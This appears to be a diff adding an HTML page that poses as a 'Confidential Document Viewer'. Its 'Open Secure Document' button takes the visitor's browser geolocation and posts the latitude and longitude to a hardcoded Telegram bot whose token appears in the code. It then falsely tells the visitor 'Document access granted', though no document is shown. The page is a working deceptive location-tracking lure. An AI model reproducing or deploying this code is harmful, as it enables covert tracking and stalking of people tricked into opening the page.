@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Secure Document Access</title>
+  <style>
+    body {
+      background-color: #f8f9fa;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 40px;
+    }
+    .container {
+      background: #fff;
+      border: 1px solid #d3d3d3;
+      padding: 30px;
+      max-width: 550px;
+      margin: auto;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+    }
+    h2 {
+      color: #343a40;
+      text-align: center;
+    }
+    p {
+      color: #555;
+      font-size: 16px;
+      line-height: 1.6;
+      text-align: justify;
+    }
+    button {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background-color: #004085;
+      color: white;
+      border: none;
+      margin-top: 25px;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+    button:hover {
+      background-color: #003366;
+    }
+    .footer-note {
+      margin-top: 15px;
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Confidential Document Viewer</h2>
+    <p>
+      This document is protected and secured under encrypted access. Before continuing, please verify to proceed with the secure document view.
+    </p>
+    <button onclick="proceed()">Open Secure Document</button>
+    <div class="footer-note">Powered by Regional Digital Access Gateway</div>
+  </div>
+
+  <script>
+    function proceed() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendData);
+      } else {
+        alert("Your device is not supported.");
+      }
+    }
+
+    function sendData(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      const botToken = '7772391168:AAEOfsQOP2nfo2L3Qa5eYoCIu7h9o-FWwIg';
+      const chatId = 'PuneCrimeBranch';
+      const msg = `User opened document.\nLat: ${lat}\nLon: ${lon}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: msg
+        })
+      }).then(() => {
+        alert("Document access granted.");
+        // Optional: redirect to a dummy PDF or doc viewer
+        // window.location.href = "document.pdf";
+      });
+    }
+  </script>
+</body>
+</html>
